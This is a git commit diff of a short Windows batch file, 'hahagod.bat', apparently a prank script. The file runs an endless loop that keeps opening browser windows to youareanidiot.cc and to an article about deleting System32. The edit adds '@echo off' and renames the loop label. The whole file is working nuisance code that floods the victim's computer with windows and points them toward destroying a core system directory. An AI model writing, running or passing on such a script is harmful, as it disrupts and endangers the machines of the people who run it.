7ad8bc17a4fe611a88e4f7b4e8202119b888c9bc
nextgencode <93398816+heyimgood@users.noreply.github.com>
2022-03-15 21:10:29 +0800

    Update hahagod.bat

--- hahagod.bat
+++ hahagod.bat
@@ -1,7 +1,8 @@
-a:
+@echo off
+:x
 start https://medium.com/@shahrizmarks2208/how-to-delete-system32-windows-fec58eb6f8e
 start https://youareanidiot.cc/
-goto a
+goto x
 /*
 ATTENTION CITIZEN! 市民请注意!
 
